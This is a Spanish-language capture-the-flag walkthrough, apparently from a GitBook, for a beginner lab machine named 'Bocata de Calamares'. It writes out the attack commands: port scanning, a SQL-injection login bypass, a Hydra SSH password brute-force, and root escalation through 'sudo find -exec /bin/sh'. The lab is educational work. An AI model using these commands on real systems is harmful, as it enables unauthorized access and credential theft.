---
description: '🔍 Dificultad: Principiante'
---

# Bocata de Calamares

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.59
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1008).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.59 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1009).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH y** el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 192.168.1.59
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (1010).png" alt=""><figcaption></figcaption></figure>

Miramos a ver que contiene el puerto 80 por si encontramos alguna información relevante.

<figure><img src="../../.gitbook/assets/image (1011).png" alt=""><figcaption></figcaption></figure>

Vemos que nos advierten sobre inyecciones SQL.

<figure><img src="../../.gitbook/assets/image (1012).png" alt=""><figcaption></figcaption></figure>

Como no encontramos nada más relevante hacemos un escaneo de directorios.

```bash
gobuster dir -u http://192.168.1.59/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml
```

<figure><img src="../../.gitbook/assets/image (1019).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención el archvio **login.php** por lo que miramos que contiene.

<figure><img src="../../.gitbook/assets/image (1013).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Es un panel de login con el que probamos una **SQL Injectio**n.

```bash
admin
' OR '1'='1
```

<figure><img src="../../.gitbook/assets/image (1014).png" alt=""><figcaption></figcaption></figure>

Accedemos al enlace.

<figure><img src="../../.gitbook/assets/image (1015).png" alt=""><figcaption></figcaption></figure>

En el tercer parámetro nos da una pista en la que tenemos que codificar en **base64** la cadena **lee\_archivos**.

```bash
echo "lee_archivos" | base64
```

<figure><img src="../../.gitbook/assets/image (1016).png" alt=""><figcaption></figcaption></figure>

Metiendo esa cadena en el diccionario descubrimos que existe esa página.

<figure><img src="../../.gitbook/assets/image (1017).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1018).png" alt=""><figcaption></figcaption></figure>

Hemos localizado al usuario **superadministrator**; procederemos a intentar encontrar su contraseña utilizando **Hydra**.

```bash
hydra -l superadministrator -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.59
```

<figure><img src="../../.gitbook/assets/image (1020).png" alt=""><figcaption></figcaption></figure>

Iniciamos sesión con las credenciales obtenidas.

<figure><img src="../../.gitbook/assets/image (1021).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.&#x20;

<figure><img src="../../.gitbook/assets/image (1022).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/find/" %}

```bash
sudo find . -exec /bin/sh \; -quit
```

<figure><img src="../../.gitbook/assets/image (1023).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**.&#x20;

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
